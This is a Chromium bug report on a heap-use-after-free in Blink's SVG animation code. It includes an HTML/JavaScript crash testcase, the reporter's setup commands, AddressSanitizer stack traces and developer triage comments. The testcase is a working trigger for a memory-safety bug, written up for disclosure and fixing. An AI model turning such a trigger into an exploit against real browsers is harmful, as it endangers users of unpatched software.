# Security: heap-use-after-free in SMILTimeContainer::UpdateAnimations()

| Field | Value |
|-------|-------|
| **Issue ID** | [40094422](https://issues.chromium.org/issues/40094422) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>CSS |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | cl...@gmail.com |
| **Assignee** | al...@chromium.org |
| **Created** | 2019-03-28 |
| **Bounty** | $3,000.00 |

## Description

**-------------------------**

**VULNERABILITY DETAILS**  

The following testcase crashes the latest ASAN build of content\_shell. It may require a few reloads. It requires the --js-flags=--expose-gc flag. Place the attach animimg.svg in the same directory as crash.html

**VERSION**  

Chrome Version: asan-linux-release-645290  

Operating System: Linux 64-bit

**REPRODUCTION CASE**  

crash.html:

<script>
function start() {
o58=document.createElement('style');
o59=document.createTextNode('#id11:only-of-type { background-image: url("animimg.svg"); }');
o58.appendChild(o59);
o134=document.createElement('iframe');
try{while(document.removeChild(document.firstChild));}catch(e){}
o135=document.implementation.createHTMLDocument();
o135.body.appendChild(o58);
o135.body.appendChild(o134);
document.appendChild(o135.documentElement);
document.documentElement.setAttribute('id',unescape('id11'));
document.documentElement.contentEditable=false;
o298=window.top.frames[0];
document.open(); document.write('x'); document.close();
gc();gc();gc();gc();
location.href='javascript:location.href="crash.html"';
setTimeout("window.top.location.href='crash.html'",400);
}
</script>
<body onload="start()"></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

=================================================================  

==13962==ERROR: AddressSanitizer: heap-use-after-free on address 0x60800012acc8 at pc 0x564b9f165068 bp 0x7ffced71e260 sp 0x7ffced71e258  

READ of size 8 at 0x60800012acc8 thread T0 (content\_shell)  

#0 0x564b9f165067 in get base/memory/scoped\_refptr.h:212:27  

#1 0x564b9f165067 in Get third\_party/blink/renderer/core/style/data\_ref.h:37  

#2 0x564b9f165067 in operator-> third\_party/blink/renderer/core/style/data\_ref.h:40  

#3 0x564b9f165067 in FontInternal gen/third\_party/blink/renderer/core/style/computed\_style\_base.h:6902  

#4 0x564b9f165067 in GetFontDescription third\_party/blink/renderer/core/style/computed\_style.h:936  

#5 0x564b9f165067 in ComputedFontSize third\_party/blink/renderer/core/style/computed\_style.h:947  

#6 0x564b9f165067 in blink::CSSToLengthConversionData::FontSizes::FontSizes(blink::ComputedStyle const\*, blink::ComputedStyle const\*) third\_party/blink/renderer/core/css/css\_to\_length\_conversion\_data.cc:50  

#7 0x564b9f5e39c1 in UpdateFont third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:1068:32  

#8 0x564b9f5e39c1 in blink::StyleResolver::ApplyMatchedStandardProperties(blink::StyleResolverState&, blink::MatchResult const&, blink::StyleResolver::CacheSuccess const&, blink::StyleResolver::NeedsApplyPass&) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:1850  

#9 0x564b9f5d9dd3 in blink::StyleResolver::ApplyMatchedPropertiesAndCustomPropertyAnimations(blink::StyleResolverState&, blink::MatchResult const&, blink::Element const\*) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:1660:5  

#10 0x564b9f5d83c9 in blink::StyleResolver::StyleForElement(blink::Element\*, blink::ComputedStyle const\*, blink::ComputedStyle const\*, blink::RuleMatchingBehavior) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:811:5  

#11 0x564ba19f5ae4 in blink::SVGElement::CustomStyleForLayoutObject() third\_party/blink/renderer/core/svg/svg\_element.cc  

#12 0x564b9f8e681c in blink::Element::StyleForLayoutObject(bool) third\_party/blink/renderer/core/dom/element.cc:2295:46  

#13 0x564b9f8e88b1 in blink::Element::RecalcOwnStyle(blink::StyleRecalcChange) third\_party/blink/renderer/core/dom/element.cc:2465:19  

#14 0x564b9f8e7471 in blink::Element::RecalcStyle(blink::StyleRecalcChange) third\_party/blink/renderer/core/dom/element.cc:2348:20  

#15 0x564b9f77df25 in blink::ContainerNode::RecalcDescendantStyles(blink::StyleRecalcChange) third\_party/blink/renderer/core/dom/container\_node.cc:1405:25  

#16 0x564b9f8e7875 in blink::Element::RecalcStyle(blink::StyleRecalcChange) third\_party/blink/renderer/core/dom/element.cc  

#17 0x564b9f77df25 in blink::ContainerNode::RecalcDescendantStyles(blink::StyleRecalcChange) third\_party/blink/renderer/core/dom/container\_node.cc:1405:25  

#18 0x564b9f8e7875 in blink::Element::RecalcStyle(blink::StyleRecalcChange) third\_party/blink/renderer/core/dom/element.cc  

#19 0x564b9f6c627a in blink::StyleEngine::RecalcStyle(blink::StyleRecalcChange) third\_party/blink/renderer/core/css/style\_engine.cc:1727:38  

#20 0x564b9f7c6a33 in blink::Document::UpdateStyle() third\_party/blink/renderer/core/dom/document.cc:2346:24  

#21 0x564b9f7ba100 in blink::Document::UpdateStyleAndLayoutTree() third\_party/blink/renderer/core/dom/document.cc:2255:3  

#22 0x564b9f7c89b9 in blink::Document::UpdateStyleAndLayoutTreeForNode(blink::Node const\*) third\_party/blink/renderer/core/dom/document.cc:2459:3  

#23 0x564b9f09f446 in blink::CSSComputedStyleDeclaration::GetPropertyCSSValue(blink::CSSProperty const&) const third\_party/blink/renderer/core/css/css\_computed\_style\_declaration.cc:380:12  

#24 0x564b9f09e6c0 in blink::CSSComputedStyleDeclaration::GetPropertyValue(blink::CSSPropertyID) const third\_party/blink/renderer/core/css/css\_computed\_style\_declaration.cc:416:27  

#25 0x564ba19b6ee9 in ComputeCSSPropertyValue third\_party/blink/renderer/core/svg/svg\_animate\_element.cc:59:24  

#26 0x564ba19b6ee9 in blink::SVGAnimateElement::ResetAnimatedType() third\_party/blink/renderer/core/svg/svg\_animate\_element.cc:441  

#27 0x564ba1973fad in blink::SMILTimeContainer::UpdateAnimations(double, bool) third\_party/blink/renderer/core/svg/animation/smil\_time\_container.cc:485:25  

#28 0x564ba1971a24 in blink::SMILTimeContainer::UpdateAnimationsAndScheduleFrameIfNeeded(double, bool) third\_party/blink/renderer/core/svg/animation/smil\_time\_container.cc:414:33  

#29 0x564b9ecbf4fa in blink::TimerBase::RunInternal() third\_party/blink/renderer/platform/timer.cc:156:3  

#30 0x564b99121e93 in Run base/callback.h:97:12  

#31 0x564b99121e93 in base::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/task/common/task\_annotator.cc:119  

#32 0x564b99158782 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence\_manager::LazyNow\*, bool\*) base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:339:23  

#33 0x564b99158187 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork() base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:220:7  

#34 0x564b99089ac0 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:39:55  

#35 0x564b9915a03b in Run base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:408:12  

#36 0x564b9915a03b in non-virtual thunk to base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool) base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc  

#37 0x564b990e2117 in base::RunLoop::Run() base/run\_loop.cc:157:14  

#38 0x564ba4ebba3b in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:223:16  

#39 0x564b96e0632d in content::RunZygote(content::ContentMainDelegate\*) content/app/content\_main\_runner\_impl.cc:513:14  

#40 0x564b96e098fa in content::ContentMainRunnerImpl::Run(bool) content/app/content\_main\_runner\_impl.cc:881:10  

#41 0x564b9deff714 in service\_manager::Main(service\_manager::MainParams const&) services/service\_manager/embedder/main.cc:415:29  

#42 0x564b943b8b24 in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:10  

#43 0x564b91b2fb4b in main content/shell/app/shell\_main.cc:39:10  

#44 0x7f06f2edab96 in \_\_libc\_start\_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310

0x60800012acc8 is located 40 bytes inside of 96-byte region [0x60800012aca0,0x60800012ad00)  

freed by thread T0 (content\_shell) here:  

#0 0x564b91b00d4d in \_\_interceptor\_free /b/swarming/w/ir/k/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:123:3  

#1 0x564b9f9b6a3b in SetComputedStyle third\_party/blink/renderer/core/dom/node.cc:183:3  

#2 0x564b9f9b6a3b in blink::Node::SetComputedStyle(scoped\_refptr[blink::ComputedStyle](javascript:void(0);)) third\_party/blink/renderer/core/dom/node.cc:927  

#3 0x564b9f8e53a7 in blink::Element::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/dom/element.cc:2262:5  

#4 0x564ba19e5721 in blink::SVGElement::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/svg/svg\_element.cc:84:12  

#5 0x564b9f776a2d in blink::ContainerNode::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/dom/container\_node.cc:987:12  

#6 0x564b9f7cc0e4 in blink::Document::Shutdown() third\_party/blink/renderer/core/dom/document.cc:2803:18  

#7 0x564ba00456df in blink::LocalFrame::DetachImpl(blink::FrameDetachType) third\_party/blink/renderer/core/frame/local\_frame.cc:417:18  

#8 0x564ba0004205 in blink::Frame::Detach(blink::FrameDetachType) third\_party/blink/renderer/core/frame/frame.cc:81:3  

#9 0x564ba1477436 in blink::Page::WillBeDestroyed() third\_party/blink/renderer/core/page/page.cc:811:15  

#10 0x564ba19627db in blink::SVGImage::~SVGImage() third\_party/blink/renderer/core/svg/graphics/svg\_image.cc:111:19  

#11 0x564ba19628dd in blink::SVGImage::~SVGImage() third\_party/blink/renderer/core/svg/graphics/svg\_image.cc:102:23  

#12 0x564ba1382a72 in DeleteInternal[blink::Image](javascript:void(0);) third\_party/blink/renderer/platform/wtf/thread\_safe\_ref\_counted.h:64:5  

#13 0x564ba1382a72 in Destruct third\_party/blink/renderer/platform/wtf/thread\_safe\_ref\_counted.h:44  

#14 0x564ba1382a72 in Release base/memory/ref\_counted.h:403  

#15 0x564ba1382a72 in Release base/memory/scoped\_refptr.h:297  

#16 0x564ba1382a72 in ~scoped\_refptr base/memory/scoped\_refptr.h:209  

#17 0x564ba1382a72 in ~ImageResourceContent third\_party/blink/renderer/core/loader/resource/image\_resource\_content.h:43  

#18 0x564ba1382a72 in FinalizeGarbageCollectedObject third\_party/blink/renderer/platform/heap/garbage\_collected.h:211  

#19 0x564ba1382a72 in Finalize third\_party/blink/renderer/platform/heap/finalizer\_traits.h:30  

#20 0x564ba1382a72 in blink::FinalizerTrait[blink::ImageResourceContent](javascript:void(0);)::Finalize(void\*) third\_party/blink/renderer/platform/heap/finalizer\_traits.h:56  

#21 0x564b967a3276 in Finalize third\_party/blink/renderer/platform/heap/heap\_page.cc:103:5  

#22 0x564b967a3276 in blink::NormalPage::Sweep() third\_party/blink/renderer/platform/heap/heap\_page.cc:1342  

#23 0x564b9679c11a in SweepUnsweptPage third\_party/blink/renderer/platform/heap/heap\_page.cc:282:31  

#24 0x564b9679c11a in blink::BaseArena::CompleteSweep() third\_party/blink/renderer/platform/heap/heap\_page.cc:338  

#25 0x564b96785ed2 in blink::ThreadHeap::CompleteSweep() third\_party/blink/renderer/platform/heap/heap.cc:418:17  

#26 0x564b967aebb4 in blink::ThreadState::CompleteSweep() third\_party/blink/renderer/platform/heap/thread\_state.cc:1053:12  

#27 0x564b967a1093 in blink::NormalPageArena::OutOfLineAllocate(unsigned long, unsigned long) third\_party/blink/renderer/platform/heap/heap\_page.cc:923:21  

#28 0x564b9f0a50f1 in AllocateObject third\_party/blink/renderer/platform/heap/heap\_page.h:1055:10  

#29 0x564b9f0a50f1 in blink::CSSPropertyValue\* blink::HeapAllocator::AllocateExpandedVectorBacking[blink::CSSPropertyValue](javascript:void(0);)(unsigned long) third\_party/blink/renderer/platform/heap/heap\_allocator.h:90  

#30 0x564b9f134275 in AllocateExpandedBuffer third\_party/blink/renderer/platform/wtf/vector.h:407:17  

#31 0x564b9f134275 in WTF::Vector<blink::CSSPropertyValue, 4u, blink::HeapAllocator>::ReserveCapacity(unsigned int) third\_party/blink/renderer/platform/wtf/vector.h:1658  

#32 0x564b9f133d1c in blink::MutableCSSPropertyValueSet::AddParsedProperties(blink::HeapVector<blink::CSSPropertyValue, 256u> const&) third\_party/blink/renderer/core/css/css\_property\_value\_set.cc:462:20  

#33 0x564b9f380486 in blink::CSSParserImpl::ParseValue(blink::MutableCSSPropertyValueSet\*, blink::CSSPropertyID, WTF::String const&, bool, blink::CSSParserContext const\*) third\_party/blink/renderer/core/css/parser/css\_parser\_impl.cc:89:31  

#34 0x564b9f370fa6 in ParseValue third\_party/blink/renderer/core/css/parser/css\_parser.cc:165:10  

#35 0x564b9f370fa6 in blink::CSSParser::ParseValue(blink::MutableCSSPropertyValueSet\*, blink::CSSPropertyID, WTF::String const&, bool, blink::SecureContextMode, blink::StyleSheetContents\*) third\_party/blink/renderer/core/css/parser/css\_parser.cc:127  

#36 0x564b9f1323cb in blink::MutableCSSPropertyValueSet::SetProperty(blink::CSSPropertyID, WTF::String const&, bool, blink::SecureContextMode, blink::StyleSheetContents\*) third\_party/blink/renderer/core/css/css\_property\_value\_set.cc:378:10  

#37 0x564b9f9f9de1 in blink::ComputePresentationAttributeStyle(blink::Element&) third\_party/blink/renderer/core/dom/presentation\_attribute\_style.cc:176:15  

#38 0x564b9f91112e in blink::Element::UpdatePresentationAttributeStyle() third\_party/blink/renderer/core/dom/element.cc:5236:7  

#39 0x564b9f5d4bfb in PresentationAttributeStyle third\_party/blink/renderer/core/dom/element.h:1358:5  

#40 0x564b9f5d4bfb in blink::StyleResolver::MatchAllRules(blink::StyleResolverState&, blink::ElementRuleCollector&, bool) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:556  

#41 0x564b9f5d7b63 in blink::StyleResolver::StyleForElement(blink::Element\*, blink::ComputedStyle const\*, blink::ComputedStyle const\*, blink::RuleMatchingBehavior) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:774:5  

#42 0x564ba19f5ae4 in blink::SVGElement::CustomStyleForLayoutObject() third\_party/blink/renderer/core/svg/svg\_element.cc  

#43 0x564b9f8e681c in blink::Element::StyleForLayoutObject(bool) third\_party/blink/renderer/core/dom/element.cc:2295:46  

#44 0x564b9f8e88b1 in blink::Element::RecalcOwnStyle(blink::StyleRecalcChange) third\_party/blink/renderer/core/dom/element.cc:2465:19

previously allocated by thread T0 (content\_shell) here:  

#0 0x564b91b00fcd in \_\_interceptor\_malloc /b/swarming/w/ir/k/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:145:3  

#1 0x564ba18eec2a in PartitionAllocGenericFlags base/allocator/partition\_allocator/partition\_alloc.h:362:48  

#2 0x564ba18eec2a in Alloc base/allocator/partition\_allocator/partition\_alloc.h:383  

#3 0x564ba18eec2a in FastMalloc third\_party/blink/renderer/platform/wtf/allocator/partitions.h:114  

#4 0x564ba18eec2a in operator new third\_party/blink/renderer/platform/wtf/ref\_counted.h:44  

#5 0x564ba18eec2a in blink::ComputedStyle::Create() third\_party/blink/renderer/core/style/computed\_style.cc:122  

#6 0x564b9f5d5d1a in blink::StyleResolver::InitialStyleForElement(blink::Document&) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:1028:48  

#7 0x564b9f5d71e1 in blink::StyleResolver::StyleForElement(blink::Element\*, blink::ComputedStyle const\*, blink::ComputedStyle const\*, blink::RuleMatchingBehavior) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:738:22  

#8 0x564ba19f5ae4 in blink::SVGElement::CustomStyleForLayoutObject() third\_party/blink/renderer/core/svg/svg\_element.cc  

#9 0x564b9f8e681c in blink::Element::StyleForLayoutObject(bool) third\_party/blink/renderer/core/dom/element.cc:2295:46  

#10 0x564b9f8e88b1 in blink::Element::RecalcOwnStyle(blink::StyleRecalcChange) third\_party/blink/renderer/core/dom/element.cc:2465:19  

#11 0x564b9f8e7471 in blink::Element::RecalcStyle(blink::StyleRecalcChange) third\_party/blink/renderer/core/dom/element.cc:2348:20  

#12 0x564b9f6c627a in blink::StyleEngine::RecalcStyle(blink::StyleRecalcChange) third\_party/blink/renderer/core/css/style\_engine.cc:1727:38  

#13 0x564b9f7c6a33 in blink::Document::UpdateStyle() third\_party/blink/renderer/core/dom/document.cc:2346:24  

#14 0x564b9f7ba100 in blink::Document::UpdateStyleAndLayoutTree() third\_party/blink/renderer/core/dom/document.cc:2255:3  

#15 0x564b9f7f3001 in blink::Document::FinishedParsing() third\_party/blink/renderer/core/dom/document.cc:6055:7  

#16 0x564ba1ca61d0 in blink::XMLDocumentParser::end() third\_party/blink/renderer/core/xml/parser/xml\_document\_parser.cc:414:18  

#17 0x564ba0052770 in blink::LocalFrame::ForceSynchronousDocumentInstall(WTF::AtomicString const&, scoped\_refptr[blink::SharedBuffer](javascript:void(0);)) third\_party/blink/renderer/core/frame/local\_frame.cc:1455:28  

#18 0x564ba196c60a in blink::SVGImage::DataChanged(bool) third\_party/blink/renderer/core/svg/graphics/svg\_image.cc:805:10  

#19 0x564ba1389930 in blink::ImageResourceContent::UpdateImage(scoped\_refptr[blink::SharedBuffer](javascript:void(0);), blink::ResourceStatus, blink::ImageResourceContent::UpdateImageOption, bool, bool) third\_party/blink/renderer/core/loader/resource/image\_resource\_content.cc:428:35  

#20 0x564ba137fc0c in UpdateImage third\_party/blink/renderer/core/loader/resource/image\_resource.cc:729:31  

#21 0x564ba137fc0c in blink::ImageResource::Finish(base::TimeTicks, base::SingleThreadTaskRunner\*) third\_party/blink/renderer/core/loader/resource/image\_resource.cc:435  

#22 0x564b9685a9ca in blink::ResourceFetcher::HandleLoaderFinish(blink::Resource\*, base::TimeTicks, blink::ResourceFetcher::LoaderFinishType, unsigned int, bool, std::\_\_1::vector<network::cors::PreflightTimingInfo, std::\_\_1::allocator[network::cors::PreflightTimingInfo](javascript:void(0);) > const&) third\_party/blink/renderer/platform/loader/fetch/resource\_fetcher.cc:1801:15  

#23 0x564b96887ea8 in blink::ResourceLoader::DidFinishLoading(base::TimeTicks, long, long, long, bool, std::\_\_1::vector<network::cors::PreflightTimingInfo, std::\_\_1::allocator[network::cors::PreflightTimingInfo](javascript:void(0);) > const&) third\_party/blink/renderer/platform/loader/fetch/resource\_loader.cc:1147:13  

#24 0x564b968874a6 in blink::ResourceLoader::DidFinishLoadingBody() third\_party/blink/renderer/platform/loader/fetch/resource\_loader.cc:496:5  

#25 0x564b968b2ba8 in blink::ResponseBodyLoader::OnStateChange() third\_party/blink/renderer/platform/loader/fetch/response\_body\_loader.cc  

#26 0x564b968881be in blink::ResourceLoader::DidFinishLoading(base::TimeTicks, long, long, long, bool, std::\_\_1::vector<network::cors::PreflightTimingInfo, std::\_\_1::allocator[network::cors::PreflightTimingInfo](javascript:void(0);) > const&) third\_party/blink/renderer/platform/loader/fetch/resource\_loader.cc:1128:39  

#27 0x564ba41f7ead in content::WebURLLoaderImpl::Context::MaybeCompleteRequest() content/renderer/loader/web\_url\_loader\_impl.cc:1041:16  

#28 0x564ba4200d1f in content::ResourceDispatcher::OnRequestComplete(int, network::URLLoaderCompletionStatus const&) content/renderer/loader/resource\_dispatcher.cc:322:9  

#29 0x564ba420fb05 in content::URLLoaderClientImpl::OnComplete(network::URLLoaderCompletionStatus const&) content/renderer/loader/url\_loader\_client\_impl.cc:327:27  

#30 0x564b93d8d997 in content::ThrottlingURLLoader::OnComplete(network::URLLoaderCompletionStatus const&) content/common/throttling\_url\_loader.cc:658:23  

#31 0x564b928293eb in network::mojom::URLLoaderClientStubDispatch::Accept(network::mojom::URLLoaderClient\*, mojo::Message\*) gen/services/network/public/mojom/url\_loader.mojom.cc:1417:13  

#32 0x564b992bc7de in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message\*) mojo/public/cpp/bindings/lib/interface\_endpoint\_client.cc:433:32  

#33 0x564b992cd70e in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper\*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner\*) mojo/public/cpp/bindings/lib/multiplex\_router.cc:873:42  

#34 0x564b992cbea7 in mojo::internal::MultiplexRouter::Accept(mojo::Message\*) mojo/public/cpp/bindings/lib/multiplex\_router.cc:594:38

SUMMARY: AddressSanitizer: heap-use-after-free base/memory/scoped\_refptr.h:212:27 in get  

Shadow bytes around the buggy address:  

0x0c108001d540: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c108001d550: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c108001d560: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c108001d570: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 04 fa  

0x0c108001d580: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00  

=>0x0c108001d590: fa fa fa fa fd fd fd fd fd[fd]fd fd fd fd fd fd  

0x0c108001d5a0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c108001d5b0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c108001d5c0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c108001d5d0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c108001d5e0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==13962==ABORTING

## Attachments

- [animimg.svg](attachments/animimg.svg) (image/svg+xml, 2.8 KB)

## Timeline

### cl...@chromium.org (2019-03-28)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5640918874062848.

### cl...@chromium.org (2019-03-28)

Testcase 5640918874062848 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5640918874062848.

### dr...@chromium.org (2019-03-28)

I've failed to reproduce this, and so has ClusterFuzz. Can you provide a more detailed set of steps to reproduce the crash?

[Monorail components: Blink>Fonts]

### cl...@gmail.com (2019-03-29)

It seems to be timing dependent, try changing the setTimeout to:

setTimeout("window.top.location.href='crash.html'",400*Math.random());

and see if that helps. I have been able to reproduce this reliably on a 1 vcpu GCE instance setup with the following commands and crash.html and animimg.svg placed in the root directory:

wget "https://www.googleapis.com/download/storage/v1/b/chromium-browser-asan/o/linux-release%2Fasan-linux-release-645493.zip?generation=1553808452077311&alt=media" -O asan.zip
sudo apt install unzip libatk-bridge2.0-0 chromium xvfb
unzip asan.zip
screen -dmS x Xvfb :1
export DISPLAY=:1
./asan-linux-release-645493/content_shell --no-sandbox --js-flags=--expose-gc crash.html




### sh...@chromium.org (2019-03-29)

Thank you for providing more feedback. Adding the requester to the cc list.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dr...@chromium.org (2019-03-29)

Thank you, that reproduced very cleanly, even without the --no-sandbox flag. Adding a few people from Blink>CSS, since the issue appears in the StyleResolver.

[Monorail components: -Blink>Fonts Blink>CSS]

### al...@chromium.org (2019-04-01)

(Non ASAN build) I see this hitting a DCHECK:
[1:1:0401/160407.573894:FATAL:smil_time_container.cc(463)] Check failed: animation->HasValidTarget().   
#0 0x7f7b1311e799 base::debug::CollectStackTrace()                                                      
#1 0x7f7b13020563 base::debug::StackTrace::StackTrace()                                                 
#2 0x7f7b1303fbd0 logging::LogMessage::~LogMessage()                                                    
#3 0x7f7b0c78e9e8 blink::SMILTimeContainer::UpdateAnimations()                                          
#4 0x7f7b0c78d711 blink::SMILTimeContainer::UpdateAnimationsAndScheduleFrameIfNeeded()                  
#5 0x7f7b0c78c650 blink::SMILTimeContainer::WakeupTimerFired()                                          
#6 0x7f7b0a4bf0e6 blink::TimerBase::RunInternal()
#7 0x7f7b0a2c03c4 base::internal::Invoker<>::RunOnce()                                                  
#8 0x7f7b0a37b889 WTF::ThreadCheckingCallbackWrapper<>::Run()                                           
#9 0x7f7b1309d61e base::TaskAnnotator::RunTask()                                                        
#10 0x7f7b130b74d4 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl()  
#11 0x7f7b130b7167 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork()  
#12 0x7f7b1304c399 base::MessagePumpDefault::Run()
#13 0x7f7b130b7cd9 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run()         
#14 0x7f7b1307e00a base::RunLoop::Run()                                                                 
#15 0x7f7b11df3b86 content::RendererMain()
#16 0x7f7b11f50761 content::RunZygote()
#17 0x7f7b11f51abe content::ContentMainRunnerImpl::Run()
#18 0x7f7b05896e84 service_manager::Main()
#19 0x7f7b11f4fcb1 content::ContentMain()
#20 0x55628e4ca16b main
#21 0x7f7b077192b1 __libc_start_main
#22 0x55628e4ca02a _start
Task trace:
#0 0x7f7b0c78ce81 blink::SMILTimeContainer::NotifyIntervalsChanged()
#1 0x7f7b133591bd mojo::SimpleWatcher::Context::Notify()


### al...@chromium.org (2019-04-01)

Here's a bigger stack trace for the freeing of the object.

0x60800059a9c8 is located 40 bytes inside of 96-byte region [0x60800059a9a0,0x60800059aa00)
freed by thread T0 (content_shell) here:
    #0 0x5646eac80d4d in __interceptor_free _asan_rtl_:3
    #1 0x5646f8ab858b in SetComputedStyle //third_party/blink/renderer/core/dom/node.cc:183:3
    #2 0x5646f8ab858b in blink::Node::SetComputedStyle(scoped_refptr<blink::ComputedStyle>) //third_party/blink/renderer/core/dom/node.cc:927:0
    #3 0x5646f89e6ff7 in blink::Element::DetachLayoutTree(blink::Node::AttachContext const&) //third_party/blink/renderer/core/dom/element.cc:2297:5
    #4 0x5646faae86b1 in blink::SVGElement::DetachLayoutTree(blink::Node::AttachContext const&) //third_party/blink/renderer/core/svg/svg_element.cc:84:12
    #5 0x5646f887868d in blink::ContainerNode::DetachLayoutTree(blink::Node::AttachContext const&) //third_party/blink/renderer/core/dom/container_node.cc:987:12
    #6 0x5646f88cdd44 in blink::Document::Shutdown() //third_party/blink/renderer/core/dom/document.cc:2804:18
    #7 0x5646f9146dbf in blink::LocalFrame::DetachImpl(blink::FrameDetachType) //third_party/blink/renderer/core/frame/local_frame.cc:417:18
    #8 0x5646f91058e5 in blink::Frame::Detach(blink::FrameDetachType) //third_party/blink/renderer/core/frame/frame.cc:81:3
    #9 0x5646fa57a5d6 in blink::Page::WillBeDestroyed() //third_party/blink/renderer/core/page/page.cc:811:15
    #10 0x5646faa6576b in blink::SVGImage::~SVGImage() //third_party/blink/renderer/core/svg/graphics/svg_image.cc:111:19
    #11 0x5646faa6586d in blink::SVGImage::~SVGImage() //third_party/blink/renderer/core/svg/graphics/svg_image.cc:102:23
    #12 0x5646fa486182 in DeleteInternal<blink::Image> //third_party/blink/renderer/platform/wtf/thread_safe_ref_counted.h:64:5
    #13 0x5646fa486182 in Destruct //third_party/blink/renderer/platform/wtf/thread_safe_ref_counted.h:44:0
    #14 0x5646fa486182 in Release //base/memory/ref_counted.h:403:0
    #15 0x5646fa486182 in Release //base/memory/scoped_refptr.h:297:0
    #16 0x5646fa486182 in ~scoped_refptr //base/memory/scoped_refptr.h:209:0
    #17 0x5646fa486182 in ~ImageResourceContent //third_party/blink/renderer/core/loader/resource/image_resource_content.h:43:0
    #18 0x5646fa486182 in FinalizeGarbageCollectedObject //third_party/blink/renderer/platform/heap/garbage_collected.h:211:0
    #19 0x5646fa486182 in Finalize //third_party/blink/renderer/platform/heap/finalizer_traits.h:30:0
    #20 0x5646fa486182 in blink::FinalizerTrait<blink::ImageResourceContent>::Finalize(void*) //third_party/blink/renderer/platform/heap/finalizer_traits.h:56:0
    #21 0x5646ef8a9c06 in Finalize //third_party/blink/renderer/platform/heap/heap_page.cc:103:5
    #22 0x5646ef8a9c06 in blink::NormalPage::Sweep() //third_party/blink/renderer/platform/heap/heap_page.cc:1342:0
    #23 0x5646ef8a2afa in SweepUnsweptPage //third_party/blink/renderer/platform/heap/heap_page.cc:282:31
    #24 0x5646ef8a2afa in blink::BaseArena::CompleteSweep() //third_party/blink/renderer/platform/heap/heap_page.cc:338:0
    #25 0x5646ef88c8b2 in blink::ThreadHeap::CompleteSweep() //third_party/blink/renderer/platform/heap/heap.cc:418:17
    #26 0x5646ef8b54a4 in blink::ThreadState::CompleteSweep() //third_party/blink/renderer/platform/heap/thread_state.cc:1053:12
    #27 0x5646ef8a7a73 in blink::NormalPageArena::OutOfLineAllocate(unsigned long, unsigned long) //third_party/blink/renderer/platform/heap/heap_page.cc:923:21
    #28 0x5646f871b24d in AllocateObject //third_party/blink/renderer/platform/heap/heap_page.h:1055:10
    #29 0x5646f871b24d in blink::MatchedRule* blink::HeapAllocator::AllocateVectorBacking<blink::MatchedRule>(unsigned long) //third_party/blink/renderer/platform/heap/heap_allocator.h:79:0
    #30 0x5646f871e6d2 in AllocateBuffer //third_party/blink/renderer/platform/wtf/vector.h:395:17
    #31 0x5646f871e6d2 in WTF::Vector<blink::MatchedRule, 32u, blink::HeapAllocator>::ReserveCapacity(unsigned int) //third_party/blink/renderer/platform/wtf/vector.h:1641:0
